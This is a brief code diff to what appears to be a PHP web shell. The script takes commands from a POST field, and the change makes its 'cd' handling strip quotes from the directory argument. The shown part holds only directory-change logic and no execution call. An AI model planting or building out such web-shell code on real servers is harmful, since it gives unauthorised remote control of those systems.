@@ -12,6 +12,7 @@ $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
 @chdir($dir);
 if (preg_match('#^(?:cd|chdir)\s+(.+)$#', $cmd, $matches))
 {
+    $matches[1] = trim($matches[1], '\'"');
     if (@chdir($dir . '/' . $matches[1]))
     {
         $output = 'Working directory changed';
